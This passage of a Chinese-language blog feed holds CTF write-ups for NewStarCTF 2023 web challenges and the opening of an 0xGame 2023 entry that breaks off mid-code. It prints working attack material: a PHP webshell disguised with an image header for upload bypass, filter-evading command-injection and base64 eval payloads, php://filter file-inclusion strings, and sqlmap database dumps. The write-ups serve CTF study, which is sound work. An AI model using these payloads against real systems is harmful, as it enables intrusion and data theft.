    <link href="/2023/10/16/newstarctf2023/"/>
    <url>/2023/10/16/newstarctf2023/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>输入<code>www.zip</code>下载<br>flag在index.php和robots.txt中<br>拼接起来为<br>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>文件上传题，没有过滤<br>上传一个1.png(对上传有筛查，只允许png，jpg等等图片格式)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89A<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>抓包，把后缀改为.php<br>上传后，页面给了一个上传的路径<br>&#x2F;upload&#x2F;1.php</p><p>payload：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean">POST:<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-comment">//1.php</span><br><br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br><span class="hljs-comment">//bin boot dev etc fllll4g home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span><br><br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /fllll4g&#x27;</span>);<br><span class="hljs-comment">//flag&#123;5c01bfc6-d871-4676-acb8-735946ea79c4&#125; </span><br></code></pre></td></tr></table></figure><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p>按照它的步骤来<br>1.GET:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">Ctf</span>=123<br></code></pre></td></tr></table></figure><p>2.POST:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">secret=<span class="hljs-symbol">n3</span>wst<span class="hljs-number">4</span>rCTF<span class="hljs-number">2023</span><span class="hljs-name">g00000</span>d<br><span class="hljs-comment">//查看源代码知secret</span><br></code></pre></td></tr></table></figure><p>3.Cookie:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">power</span><span class="hljs-operator">=</span>ctfer<br></code></pre></td></tr></table></figure><p>4.User Agent:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent: NewStarCTF2023<br></code></pre></td></tr></table></figure><p>5.Referer:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Referer:</span> newstarctf.com<br></code></pre></td></tr></table></figure><p>6.<a href="https://blog.csdn.net/qq_43168364/article/details/108604163">ip伪造</a>(常用的X-Forwarded-For在这里用不了)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">x</span>-real-ip: <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;d9378a7b-<span class="hljs-number">35</span>cb-<span class="hljs-number">4</span>a50-b743-<span class="hljs-number">163</span>b331f9da8&#125; <br></code></pre></td></tr></table></figure><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p>按提示的来，如果GET两个参数都为数字，会显示not ssti,flag in source code~3<br>测试几次发现code后的数字为number1+number2，把其中一个改为字符试一试<br>GET</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?<span class="hljs-symbol">number1</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-symbol">number2</span>=abc<br></code></pre></td></tr></table></figure><p>ValueError，倒是符合题目名称<br>在报错信息中寻找flag<br><img src="/images/Z3YAZODGO2MQO87TQZXDQ.png"><br>flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">Y0u_@</span>re_3enset1ve_4bout_deb8g&#125;<br></code></pre></td></tr></table></figure><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Level 1<br>MD5数组绕过</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">?key1<span class="hljs-comment">[]</span>=1&amp;key2<span class="hljs-comment">[]</span>=2<br></code></pre></td></tr></table></figure><p>Level 2<br>数组绕过</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">key3[]<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>Level 3<br>strcmp字符串比较函数，两字符串完全相同返回0，不知道flag，所以用数组绕过NULL&#x3D;&#x3D;NULL</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">key4[]<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>Level 4<br>is_numeric还是数组绕过，也可以在最后加入字符</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">key5[]<span class="hljs-operator">=</span><span class="hljs-number">2024</span><br>or<br><span class="hljs-attribute">key5</span><span class="hljs-operator">=</span><span class="hljs-number">2024</span>a<br>or<br><span class="hljs-attribute">key5</span><span class="hljs-operator">=</span><span class="hljs-number">2024</span>%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>Level 5<br><code>extract($_POST)</code><br>变量覆盖所有post输入<br><code>foreach($_POST as $var)</code><br>foreach语句将遍历数组array，每次循环时，将当前数组中的值赋给var<br>仔细查看代码可以发现，这一关是没有给flag5赋值的代码<br>if检测flag5的存在，所以知道让post中有flag5这个变量即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">key3</span>[]=<span class="hljs-number">1</span>&amp;flag5=?<br><span class="hljs-attribute">or</span><br><span class="hljs-attribute">key3</span>[]=<span class="hljs-number">1</span>&amp;flag5[]=<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$password</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)===<span class="hljs-string">&quot;c4d038&quot;</span>)&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>第二个if<br><code>if(substr($password,0,6)===&quot;c4d038&quot;)</code><br>意思是password被MD5加密后的前6位为c4d038<br>对于第二个if，我们可以自己写一个脚本，或者网上找资源</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">import hashlib<br><br>def <span class="hljs-built_in">crack</span>(pre):<br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">999999</span>):<br>        if (hashlib.<span class="hljs-built_in">md5</span>(<span class="hljs-built_in">str</span>(i).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&quot;UTF-8&quot;</span>)).<span class="hljs-built_in">hexdigest</span>())[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-built_in">str</span>(pre):<br>            <span class="hljs-built_in">print</span>(i)<br>            break<br><br><br><span class="hljs-built_in">crack</span>(<span class="hljs-string">&quot;c4d038&quot;</span>)<br></code></pre></td></tr></table></figure><p>得出password&#x3D;114514<br>接着构造<code>e_v.a.l</code><br>注：要把第一个_改为[,这样就不会出错<br>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了</p><p>&#x2F;flag|system|pass|cat|ls都被过滤了<br>首先考虑base64编码绕过<br>注：eval()函数把字符串按照 PHP 代码来计算。字符串必须是合法的 PHP 代码，且<strong>必须以分号结尾。</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>base64:system(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>password=<span class="hljs-number">114514</span>&amp;e[v.a.l=eval(base64_decode(<span class="hljs-string">&#x27;c3lzdGVtKCdscycpOw==&#x27;</span>));<br><span class="hljs-regexp">//</span> index.php<br><br><span class="hljs-regexp">//</span>base64:system(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>password=<span class="hljs-number">114514</span>&amp;e[v.a.l=eval(base64_decode(<span class="hljs-string">&#x27;c3lzdGVtKCdscyAvJyk7&#x27;</span>));<br><span class="hljs-regexp">//</span>bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var<br><br><span class="hljs-regexp">//</span>base64:system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br>password=<span class="hljs-number">114514</span>&amp;e[v.a.l=eval(base64_decode(<span class="hljs-string">&#x27;c3lzdGVtKCdjYXQgL2ZsYWcnKTs=&#x27;</span>));<br><span class="hljs-regexp">//</span>flag&#123;e6db2c1a-<span class="hljs-number">844</span>e-<span class="hljs-number">4</span>c2f-b173-<span class="hljs-number">6424</span>dddd6511&#125;<br></code></pre></td></tr></table></figure><p><strong>方法二：</strong><br>system还有一种表达方式&#96;&#96;(反引号)<br>使用这种方法要配合echo</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">password=<span class="hljs-number">114514</span>&amp;e[v.a.l=<span class="hljs-keyword">echo</span> `l<span class="hljs-string">&#x27;&#x27;</span>s`;<span class="hljs-comment">//ls中间为单引号，可以绕过过滤\也可绕过过滤</span><br><span class="hljs-comment">//index.php</span><br><br>password=<span class="hljs-number">114514</span>&amp;e[v.a.l=<span class="hljs-keyword">echo</span> `l\s /`;<br><span class="hljs-comment">//bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</span><br><br>password=<span class="hljs-number">114514</span>&amp;e[v.a.l=<span class="hljs-keyword">echo</span> `ca<span class="hljs-string">&#x27;&#x27;</span>t /f\lag`;<br><span class="hljs-comment">//flag&#123;e6db2c1a-844e-4c2f-b173-6424dddd6511&#125;</span><br></code></pre></td></tr></table></figure><h2 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// FLAG in the flag.php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/base|rot/i&#x27;</span>,<span class="hljs-variable">$file</span>))&#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>@是忽略报错提示<br>其余代码很简单<br>本题preg_match不可绕过<br>过滤的为两个过滤器<br>换个过滤器即可<br>找个合适的过滤器真不容易啊o(TヘTo)<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.iconv.utf-8.utf-16/</span>resource=flag.php<br>or<br>?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=flag.php<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/gental_z/article/details/122303393">Filter伪协议</a><br><a href="https://www.anquanke.com/post/id/202510#h3-9">探索php:&#x2F;&#x2F;filter在实战当中的奇技淫巧</a></p><p>flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;<span class="hljs-number">9</span>edaf<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span><span class="hljs-number">-774</span>d<span class="hljs-number">-4</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>d-a<span class="hljs-number">779</span>-e<span class="hljs-number">39</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>b<span class="hljs-number">3482</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>f12调试器有游戏的源代码<br><img src="/images/S4FE02JII290NB39EL.png"><br>当gameScore&gt;100000时，gameover()POST了我们的分数到&#x2F;api.php<br>这里需要伪造分数POST上传，格式为json</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">POST</span><br>&#123;<br>    <span class="hljs-string">&quot;score&quot;</span>:100001<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/LHSFMFAAO9ON6.png"><br>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;c7231da2-bab1-<span class="hljs-number">42</span>f4-<span class="hljs-number">8</span>ede-b7f249eb335d&#125;<br></code></pre></td></tr></table></figure><h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>使用sqlmap一把撸</p><p><strong>查看数据库</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://19f56f63-b51a-4cf1-95c2-c36947fd7288.node4.buuoj.cn:81/?id=TMP0919&quot;</span> <span class="hljs-attr">--dbs</span> <span class="hljs-attr">--batch</span><br><br><span class="hljs-selector-attr">[*]</span> ctf<br><span class="hljs-selector-attr">[*]</span> information_schema<br><span class="hljs-selector-attr">[*]</span> mysql<br><span class="hljs-selector-attr">[*]</span> performance_schema<br><span class="hljs-selector-attr">[*]</span> sys<br><span class="hljs-selector-attr">[*]</span> test<br></code></pre></td></tr></table></figure><p><strong>查看数据库里的表</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">python sqlmap.py -u &quot;http://19f56f63-b51a-4cf1-95c2-c36947fd7288.node4.buuoj.cn:81/?id=TMP0919&quot; -D ctf --tables --batch<br><br><span class="hljs-code">+--------------+</span><br>| grades       |<br><span class="hljs-section">| here_is_flag |</span><br><span class="hljs-section">+--------------+</span><br><br></code></pre></td></tr></table></figure><p><strong>查看数据库里的列</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">python sqlmap.py -u &quot;http://19f56f63-b51a-4cf1-95c2-c36947fd7288.node4.buuoj.cn:81/?id=TMP0919&quot; -D ctf -T here_is_flag --columns<br><br><span class="hljs-code">+--------+</span>--------------+<br><span class="hljs-section">| Column | Type         |</span><br><span class="hljs-section">+--------+--------------+</span><br><span class="hljs-section">| flag   | varchar(255) |</span><br><span class="hljs-section">+--------+--------------+</span><br></code></pre></td></tr></table></figure><p><strong>查看数据库里具体的值</strong></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">python sqlmap.py -u &quot;http://19f56f63-b51a-4cf1-95c2-c36947fd7288.node4.buuoj.cn:81/?id=TMP0919&quot; -D ctf -T here_is_flag -C flag --dump<br><br><span class="hljs-code">+--------------------------------------------+</span><br><span class="hljs-section">| flag                                       |</span><br><span class="hljs-section">+--------------------------------------------+</span><br><span class="hljs-section">| flag&#123;9dcdebb4-55dd-4d4c-80ab-42abcbf5ea0e&#125; |</span><br><span class="hljs-section">+--------------------------------------------+</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>0xgame 2023</title>
    <link href="/2023/10/13/0xgame%202023/"/>
    <url>/2023/10/13/0xgame%202023/</url>
    
    <content type="html"><![CDATA[<h2 id="web–signin"><a href="#web–signin" class="headerlink" title="web–signin"></a>web–signin</h2><p>查看源代码<br>看到有个js文件<br>在源代码最下面找个被注释的内容</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-comment"># sourceMappingURL=index-33309f51.js.map</span><br></code></pre></td></tr></table></figure><p>进入&#x2F;assets&#x2F;index-33309f51.js.map<br>下载了一个文件，用记事本打开<br>ctrl+f查找关键词，0xgame找到flag<br>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;c788fa80-<span class="hljs-number">2184</span>-<span class="hljs-number">429</span>f-b410-<span class="hljs-number">48</span>cb8e2de0ff&#125;<br></code></pre></td></tr></table></figure><p>在main.js下也能找到flag<br><img src="/images/GWTHD5LASUD1AXCTJ.png"></p><h2 id="web–baby-php"><a href="#web–baby-php" class="headerlink" title="web–baby_php"></a>web–baby_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 